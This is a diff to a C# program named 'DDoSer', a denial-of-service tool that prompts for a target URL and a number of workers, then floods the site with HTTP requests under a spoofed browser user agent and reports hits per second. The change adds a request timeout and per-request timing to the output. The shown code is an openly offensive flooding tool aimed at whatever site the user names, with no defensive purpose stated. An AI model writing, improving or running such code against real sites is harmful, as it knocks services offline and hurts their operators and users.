@@ -25,6 +25,7 @@ namespace DDoSer
 
             Console.Write("URL name of TARGET (Example https://www.google.com/): ");
             string url = Console.ReadLine();
+            int requestTimeoutInSec = 60;
             string userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3";
 
             Console.Write("Workers count: ");
@@ -46,11 +47,14 @@ namespace DDoSer
                     {
                         try
                         {
+                            Stopwatch stopwatch = Stopwatch.StartNew();
                             HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                             request.UserAgent = userAgent;
+                            request.Timeout = 1000 * requestTimeoutInSec;
                             HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+                            stopwatch.Stop();
                             ++count;
-                            Console.WriteLine($"Hitted: {count}\tSpeed: {speed}/sec");
+                            Console.WriteLine($"Hitted: {count}\tSpeed: {speed}/sec\tTime: {stopwatch.Elapsed.TotalMilliseconds}ms");
                         }
                         catch (Exception e)
                         {
